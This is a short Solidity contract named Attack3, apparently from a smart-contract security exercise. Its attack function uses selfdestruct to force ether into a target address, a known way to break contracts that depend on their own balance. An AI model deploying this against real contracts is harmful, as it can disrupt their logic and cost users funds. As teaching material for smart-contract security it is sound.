// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

contract Attack3 {

    function attack(address _address) public payable {
        selfdestruct(payable(_address));
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }

}